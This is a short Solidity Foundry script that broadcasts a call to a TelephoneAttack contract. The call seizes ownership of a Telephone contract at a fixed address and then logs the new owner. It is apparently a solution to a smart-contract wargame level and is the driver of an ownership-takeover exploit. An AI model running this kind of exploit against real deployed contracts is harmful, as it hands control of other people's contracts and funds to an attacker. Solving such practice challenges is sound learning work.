// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {TelephoneAttack} from "../src/TelephoneAttack.sol";
import {Telephone} from "../src/Telephone.sol";

contract TelephoneScript is Script {
    TelephoneAttack public attack;
    Telephone public telephone;

    function setUp() public {
        attack = TelephoneAttack(0xcb7C523C844Bd266a14449220F56288798AB8170);
        telephone = Telephone(0xebA9DAADbE2804454D72aD85d7a9e9C04960aa6f);
    }

    function run() public {
        vm.startBroadcast();

        attack.changeOwner(telephone);

        console.log(telephone.owner());

        vm.stopBroadcast();
    }
}